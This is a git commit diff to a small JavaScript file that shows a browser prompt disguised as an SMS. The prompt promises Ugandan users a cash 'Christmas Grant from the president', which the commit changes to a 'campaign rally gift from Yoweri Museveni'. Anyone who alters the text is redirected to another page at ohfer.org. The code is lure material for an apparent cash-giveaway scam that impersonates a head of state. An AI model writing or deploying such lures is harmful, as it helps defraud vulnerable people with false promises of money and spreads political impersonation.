a4c37d7bd51b094ba7ecfc76f0e1065b40bf1e52
ekpanewblog5 <ukpehaitid3@gmail.com>
2026-01-07 21:07:59 +0100

    Update ug-active.js

--- ug-active.js
+++ ug-active.js
@@ -1,10 +1,10 @@
   
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = 'WITHDRAW UGX105,000'
+var password = 'WITHDRAW UGX35,000'
 password = prompt(
-  'SMS: Congratulations! You are eligible to receive the UGX105,000 Christmas Grant from the president. Please press OK to withdraw CASH now.',
-  'WITHDRAW UGX105,000'
+  'SMS: Congratulations! You are eligible to receive the UGX35,000 CAMPAIGN RALLY GIFT from Yoweri Museveni. Please press OK to withdraw CASH now.',
+  'WITHDRAW UGX35,000'
 );
-if (password != 'WITHDRAW UGX105,000') {
+if (password != 'WITHDRAW UGX35,000') {
   location.href = 'https://ohfer.org/xmas-uganda.html';
 }
